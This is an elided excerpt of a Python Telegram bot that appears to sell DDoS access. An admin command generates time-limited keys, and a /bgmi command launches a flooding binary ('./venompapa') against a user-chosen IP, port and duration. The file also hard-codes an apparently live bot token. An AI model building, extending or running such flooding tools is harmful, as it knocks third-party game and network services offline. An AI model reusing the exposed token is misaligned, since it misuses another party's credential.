...
BOT_TOKEN = '8000499226:AAGMaE6gzeK4tLql9dH1UaI9eOaMOWL_0CE'
...
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            ...
            response = "Usage: /genkey <hours/days>"
    else:
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_command = ['./venompapa', target_ip, port, duration, str(DEFAULT_THREADS)]
